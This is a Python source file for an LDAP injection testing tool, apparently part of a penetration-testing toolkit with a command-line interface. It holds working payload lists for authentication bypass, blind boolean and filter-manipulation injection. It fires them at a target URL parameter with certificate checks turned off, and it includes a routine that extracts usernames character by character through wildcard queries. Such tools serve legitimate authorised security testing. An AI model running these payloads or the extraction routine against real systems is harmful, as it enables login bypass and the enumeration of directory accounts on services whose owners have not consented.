"""
LDAP Injection Testing Wrapper - Tests for LDAP injection vulnerabilities
"""
import sys
import argparse
import json
import requests
from pathlib import Path
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from utils.base_wrapper import InjectionTool


@dataclass
class LDAPFinding:
    """Represents an LDAP injection finding"""
    payload: str
    payload_type: str
    status_code: int
    response_length: int
    diff_from_baseline: int
    potential_vuln: bool
    evidence: Optional[str] = None


class LDAPInjectionTester(InjectionTool):
    """Wrapper for LDAP injection testing"""

    # Basic LDAP injection payloads
    BASIC_PAYLOADS = [
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin*",
        "admin*)((|userPassword=*)",
        "*)(uid=*))%00",
        "x])|(&(cn=*",
        "*()|%26'",
        "admin)(&)",
        "admin)(|(password=*))",
        "*)%00",
        "*))%00",
        "\\00",
        "\\2a",  # * encoded
    ]

    # Authentication bypass payloads
    AUTH_BYPASS_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))(|(password=*",
        "*)(&(password=*)",
        "admin*))%00",
        "*)(objectClass=*",
        "*)(|(objectClass=*",
        "admin))(|(cn=*",
        "*))(|(password=*)((password=*",
        "admin)(&(objectClass=person))",
        "*)(uid=admin)(|(uid=*",
    ]

    # Boolean-based blind payloads
    BLIND_PAYLOADS = [
        "admin)(uid=*",           # True condition
        "admin)(uid=nonexistent", # False condition
        "*)(uid=admin",           # True if admin exists
        "*)(uid=randomuser12345", # False condition
        "admin)(&(cn=admin)",     # True for admin
        "admin)(&(cn=invalid)",   # False condition
    ]

    # Filter manipulation payloads
    FILTER_PAYLOADS = [
        ")(cn=*",
        ")(|(cn=*",
        ")(&(cn=*",
        "*)(cn=*)(",
        "*)(|(cn=*))(",
        "*)((cn=*",
        "*))((cn=*",
    ]

    # Special character payloads
    SPECIAL_CHAR_PAYLOADS = [
        "\\28",  # (
        "\\29",  # )
        "\\2a",  # *
        "\\5c",  # \
        "\\00",  # NUL
        "\\0a",  # LF
        "\\0d",  # CR
    ]

    # Error indicators
    ERROR_INDICATORS = [
        'ldap', 'distinguished name', 'ldap_search', 'ldap_bind',
        'invalid dn', 'naming exception', 'invalid search filter',
        'bad search filter', 'search filter', 'ldap error',
        'javax.naming', 'ldapexception', 'ldaperr', 'filter error',
        'objectclass', 'basedn', 'bind error', 'directory',
        'ldap_connect', 'ldap_start', 'ldap_result', 'active directory'
    ]

    @property
    def tool_name(self) -> str:
        return "ldap_injection"

    def _build_target_args(self, target: str, **kwargs) -> list:
        """LDAP injection doesn't use CLI - this returns empty"""
        return []

    def check_tool_installed(self) -> bool:
        """Override - this tool is pure Python"""
        try:
            import requests
            return True
        except ImportError:
            return False

    def test_injection(self, url: str, param_name: str, method: str = 'GET',
                       headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                       timeout: int = 10, payload_set: str = 'all') -> List[LDAPFinding]:
        """Test for LDAP injection vulnerabilities."""
        findings = []

        # Get baseline response
        baseline = self._get_baseline(url, param_name, method, headers, cookies, timeout)

        # Select payloads based on payload set
        if payload_set == 'basic':
            payloads = self.BASIC_PAYLOADS
        elif payload_set == 'auth_bypass':
            payloads = self.AUTH_BYPASS_PAYLOADS
        elif payload_set == 'blind':
            payloads = self.BLIND_PAYLOADS
        elif payload_set == 'filter':
            payloads = self.FILTER_PAYLOADS
        else:  # 'all'
            payloads = (self.BASIC_PAYLOADS + self.AUTH_BYPASS_PAYLOADS +
                       self.BLIND_PAYLOADS + self.FILTER_PAYLOADS)

        for payload in payloads:
            finding = self._test_payload(
                url, param_name, payload, method, headers, cookies, baseline, timeout
            )
            findings.append(finding)

        return findings

    def test_blind_injection(self, url: str, param_name: str, method: str = 'GET',
                             headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                             timeout: int = 10) -> Dict[str, Any]:
        """Test for blind LDAP injection using response comparison."""
        results = {
            'vulnerable': False,
            'technique': None,
            'evidence': []
        }

        # Test pairs: (true_condition, false_condition)
        test_pairs = [
            ("admin)(uid=*", "admin)(uid=nonexistent12345"),
            ("*)(uid=admin", "*)(uid=randomuser12345"),
            ("*))(|(cn=*", "*))(|(cn=invalidcn12345"),
        ]

        for true_payload, false_payload in test_pairs:
            try:
                # Test true condition
                true_response = self._send_request(
                    url, param_name, true_payload, method, headers, cookies, timeout
                )

                # Test false condition
                false_response = self._send_request(
                    url, param_name, false_payload, method, headers, cookies, timeout
                )

                # Compare responses
                if true_response and false_response:
                    length_diff = abs(len(true_response.text) - len(false_response.text))
                    status_diff = true_response.status_code != false_response.status_code

                    if length_diff > 50 or status_diff:
                        results['vulnerable'] = True
                        results['technique'] = 'boolean_blind'
                        results['evidence'].append({
                            'true_payload': true_payload,
                            'false_payload': false_payload,
                            'true_length': len(true_response.text),
                            'false_length': len(false_response.text),
                            'true_status': true_response.status_code,
                            'false_status': false_response.status_code,
                            'length_difference': length_diff
                        })

            except Exception as e:
                continue

        return results

    def test_error_based(self, url: str, param_name: str, method: str = 'GET',
                         headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                         timeout: int = 10) -> List[LDAPFinding]:
        """Test for error-based LDAP injection."""
        findings = []

        # Payloads designed to trigger LDAP errors
        error_payloads = [
            ")((",              # Unbalanced parentheses
            "))((",             # Multiple unbalanced
            "\\",               # Escape character
            "\\00\\00",         # Multiple NUL bytes
            "*)(*)(",           # Invalid filter syntax
            ")(|()(|",          # Complex invalid
            "\x00",             # Raw NUL byte
            "*))(cn=*",         # Invalid nesting
        ]

        baseline = self._get_baseline(url, param_name, method, headers, cookies, timeout)

        for payload in error_payloads:
            finding = self._test_payload(
                url, param_name, payload, method, headers, cookies, baseline, timeout,
                payload_type='error_based'
            )
            findings.append(finding)

        return findings

    def extract_usernames(self, url: str, param_name: str, method: str = 'GET',
                          headers: Optional[Dict] = None, cookies: Optional[Dict] = None,
                          timeout: int = 10, max_results: int = 20) -> List[str]:
        """Attempt to extract usernames using wildcard injection."""
        found_users = []
        charset = 'abcdefghijklmnopqrstuvwxyz0123456789_-.'

        # Try common prefixes
        common_prefixes = ['admin', 'user', 'test', 'dev', 'root', 'guest']

        for prefix in common_prefixes:
            payload = f"{prefix}*"
            try:
                response = self._send_request(
                    url, param_name, payload, method, headers, cookies, timeout
                )
                if response and response.status_code == 200:
                    # Check if response indicates user found
                    if 'found' in response.text.lower() or 'success' in response.text.lower():
                        found_users.append(prefix)
            except Exception:
                continue

        # Character-by-character extraction for blind injection
        for start_char in charset[:10]:  # Test first 10 chars
            payload = f"{start_char}*"
            try:
                response = self._send_request(
                    url, param_name, payload, method, headers, cookies, timeout
                )
                if response and response.status_code == 200:
                    # Potential match found
                    extracted = self._extract_value(
                        url, param_name, start_char, method, headers, cookies, timeout, charset
                    )
                    if extracted and extracted not in found_users:
                        found_users.append(extracted)
                        if len(found_users) >= max_results:
                            break
            except Exception:
                continue

        return found_users

    def _extract_value(self, url: str, param_name: str, prefix: str,
                       method: str, headers: Optional[Dict], cookies: Optional[Dict],
                       timeout: int, charset: str, max_length: int = 32) -> Optional[str]:
        """Extract a value character by character."""
        extracted = prefix

        for _ in range(max_length):
            found_char = False
            for char in charset:
                payload = f"{extracted}{char}*"
                try:
                    response = self._send_request(
                        url, param_name, payload, method, headers, cookies, timeout
                    )
                    if response and response.status_code == 200:
                        extracted += char
                        found_char = True
                        break
                except Exception:
                    continue

            if not found_char:
                break

        return extracted if len(extracted) > len(prefix) else None

    def _test_payload(self, url: str, param_name: str, payload: str,
                      method: str, headers: Optional[Dict], cookies: Optional[Dict],
                      baseline: Optional[int], timeout: int,
                      payload_type: str = 'basic') -> LDAPFinding:
        """Send request with LDAP payload."""
        try:
            response = self._send_request(
                url, param_name, payload, method, headers, cookies, timeout
            )

            if response:
                vuln_detected = self._detect_vulnerability(response, baseline)
                diff = abs(len(response.text) - baseline) if baseline else 0

                return LDAPFinding(
                    payload=payload,
                    payload_type=payload_type,
                    status_code=response.status_code,
                    response_length=len(response.text),
                    diff_from_baseline=diff,
                    potential_vuln=vuln_detected,
                    evidence=response.text[:500] if vuln_detected else None
                )
            else:
                return LDAPFinding(
                    payload=payload,
                    payload_type=payload_type,
                    status_code=0,
                    response_length=0,
                    diff_from_baseline=0,
                    potential_vuln=False,
                    evidence="No response received"
                )

        except requests.exceptions.Timeout:
            return LDAPFinding(
                payload=payload,
                payload_type=payload_type,
                status_code=0,
                response_length=0,
                diff_from_baseline=0,
                potential_vuln=True,  # Timeout can indicate injection
                evidence='Request timed out - possible injection point'
            )
        except Exception as e:
            return LDAPFinding(
                payload=payload,
                payload_type=payload_type,
                status_code=0,
                response_length=0,
                diff_from_baseline=0,
                potential_vuln=False,
                evidence=str(e)
            )

    def _send_request(self, url: str, param_name: str, payload: str,
                      method: str, headers: Optional[Dict], cookies: Optional[Dict],
                      timeout: int) -> Optional[requests.Response]:
        """Send HTTP request with payload."""
        try:
            if method.upper() == 'GET':
                response = requests.get(
                    url,
                    params={param_name: payload},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
            else:
                response = requests.post(
                    url,
                    data={param_name: payload},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    allow_redirects=False,
                    verify=False
                )
            return response
        except Exception:
            return None

    def _get_baseline(self, url: str, param_name: str, method: str,
                      headers: Optional[Dict], cookies: Optional[Dict],
                      timeout: int) -> Optional[int]:
        """Get baseline response length."""
        try:
            if method.upper() == 'GET':
                response = requests.get(
                    url,
                    params={param_name: 'test'},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    verify=False
                )
            else:
                response = requests.post(
                    url,
                    data={param_name: 'test'},
                    headers=headers,
                    cookies=cookies,
                    timeout=timeout,
                    verify=False
                )
            return len(response.text)
        except Exception:
            return None

    def _detect_vulnerability(self, response: requests.Response,
                             baseline: Optional[int]) -> bool:
        """Detect potential LDAP injection vulnerability."""
        text_lower = response.text.lower()

        # Check for LDAP error messages
        if any(indicator in text_lower for indicator in self.ERROR_INDICATORS):
            return True

        # Check for significant response length difference
        if baseline:
            length_diff = abs(len(response.text) - baseline)
            if length_diff > 100:
                return True

        # Check for unusual status codes
        if response.status_code in [500, 502, 503]:
            return True

        return False

    def run(self, target: str, output_file: str = None, **kwargs) -> Dict[str, Any]:
        """Run LDAP injection tests."""
        from datetime import datetime

        self.start_time = datetime.now()

        param_name = kwargs.get('param', 'username')
        method = kwargs.get('method', 'GET')
        headers = kwargs.get('headers')
        cookies = kwargs.get('cookies')
        payload_set = kwargs.get('payload_set', 'all')
        test_blind = kwargs.get('test_blind', False)
        test_error = kwargs.get('test_error', False)
        timeout = kwargs.get('timeout', 10)

        all_findings = []

        print(f"[*] Testing LDAP injection on {target}")
        print(f"[*] Parameter: {param_name}, Method: {method}")

        # Standard injection tests
        print("[*] Running standard LDAP injection tests...")
        findings = self.test_injection(
            url=target, param_name=param_name, method=method,
            headers=headers, cookies=cookies, timeout=timeout,
            payload_set=payload_set
        )
        all_findings.extend(findings)

        # Error-based tests
        if test_error:
            print("[*] Running error-based LDAP injection tests...")
            error_findings = self.test_error_based(
                url=target, param_name=param_name, method=method,
                headers=headers, cookies=cookies, timeout=timeout
            )
            all_findings.extend(error_findings)

        # Blind injection tests
        blind_results = None
        if test_blind:
            print("[*] Running blind LDAP injection tests...")
            blind_results = self.test_blind_injection(
                url=target, param_name=param_name, method=method,
                headers=headers, cookies=cookies, timeout=timeout
            )

        self.end_time = datetime.now()
        duration = (self.end_time - self.start_time).total_seconds()

        # Filter vulnerable findings
        vulnerable = [f for f in all_findings if f.potential_vuln]

        # Save results
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"ldap_injection_{timestamp}.json"

        results = {
            'target': target,
            'parameter': param_name,
            'method': method,
            'total_tests': len(all_findings),
            'vulnerable_count': len(vulnerable),
            'blind_results': blind_results,
            'findings': [
                {
                    'payload': f.payload,
                    'payload_type': f.payload_type,
                    'status_code': f.status_code,
                    'response_length': f.response_length,
                    'diff_from_baseline': f.diff_from_baseline,
                    'potential_vuln': f.potential_vuln,
                    'evidence': f.evidence
                }
                for f in all_findings
            ]
        }

        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to: {output_file}")

        return {
            'success': True,
            'tool': self.tool_name,
            'target': target,
            'duration': duration,
            'output_file': str(output_file),
            'results': all_findings,
            'blind_results': blind_results,
            'vulnerable_count': len(vulnerable)
        }


def main():
    parser = argparse.ArgumentParser(
        description="LDAP Injection Tester - Test for LDAP injection vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python ldap_injection.py -u "https://example.com/login" -p username
  python ldap_injection.py -u "https://example.com/search" -p query --method POST
  python ldap_injection.py -u "https://example.com/auth" -p user --test-blind
  python ldap_injection.py -u "https://example.com/ldap" -p cn --payload-set auth_bypass
        """
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", default="username", help="Parameter to test (default: username)")
    parser.add_argument("-m", "--method", default="GET", choices=['GET', 'POST'],
                       help="HTTP method (default: GET)")
    parser.add_argument("--payload-set", default="all",
                       choices=['all', 'basic', 'auth_bypass', 'blind', 'filter'],
                       help="Payload set to use (default: all)")
    parser.add_argument("--test-blind", action="store_true",
                       help="Run blind injection tests")
    parser.add_argument("--test-error", action="store_true",
                       help="Run error-based injection tests")
    parser.add_argument("-H", "--header", action="append", dest="headers",
                       help="Custom header (format: 'Name: Value')")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("-o", "--output", help="Output file path")

    args = parser.parse_args()

    # Parse headers
    headers = {}
    if args.headers:
        for h in args.headers:
            if ':' in h:
                name, value = h.split(':', 1)
                headers[name.strip()] = value.strip()

    # Parse cookies
    cookies = None
    if args.cookie:
        cookies = {}
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                cookies[name.strip()] = value.strip()

    tester = LDAPInjectionTester()

    result = tester.run(
        target=args.url,
        param=args.param,
        method=args.method,
        payload_set=args.payload_set,
        test_blind=args.test_blind,
        test_error=args.test_error,
        headers=headers if headers else None,
        cookies=cookies,
        timeout=args.timeout,
        output_file=args.output
    )

    # Print summary
    print(f"\n{'='*60}")
    print(f"LDAP Injection Test Results")
    print(f"{'='*60}")
    print(f"Target: {args.url}")
    print(f"Parameter: {args.param}")
    print(f"Total Tests: {len(result['results'])}")
    print(f"Potential Vulnerabilities: {result['vulnerable_count']}")

    if result.get('blind_results') and result['blind_results'].get('vulnerable'):
        print(f"\n[!] BLIND LDAP INJECTION DETECTED!")
        print(f"  Technique: {result['blind_results']['technique']}")

    if result['vulnerable_count'] > 0:
        print(f"\n[!] POTENTIAL LDAP INJECTION FOUND!")
        for finding in result['results']:
            if finding.potential_vuln:
                print(f"\n  Payload: {finding.payload}")
                print(f"  Type: {finding.payload_type}")
                print(f"  Status Code: {finding.status_code}")
                print(f"  Response Length Diff: {finding.diff_from_baseline}")
                if finding.evidence:
                    print(f"  Evidence: {finding.evidence[:200]}...")
    else:
        print("\n[+] No LDAP injection vulnerabilities detected")

    return 0 if result['success'] else 1


if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    sys.exit(main())
